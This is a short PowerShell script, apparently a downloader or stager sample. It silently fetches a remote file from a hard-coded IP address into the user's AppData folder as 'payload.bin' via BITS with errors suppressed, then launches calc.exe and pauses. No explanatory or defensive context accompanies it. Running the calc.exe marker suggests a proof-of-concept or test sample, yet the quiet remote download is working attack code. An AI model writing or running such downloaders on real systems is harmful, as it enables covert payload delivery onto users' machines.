
$TargetUrl = 'http://198.51.100.213:80/update.dat'
$DownloadPath = "$env:APPDATA\payload.bin"
Start-BitsTransfer -Source $TargetUrl -Destination $DownloadPath -ErrorAction SilentlyContinue
& "calc.exe"
Start-Sleep -Seconds 19
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
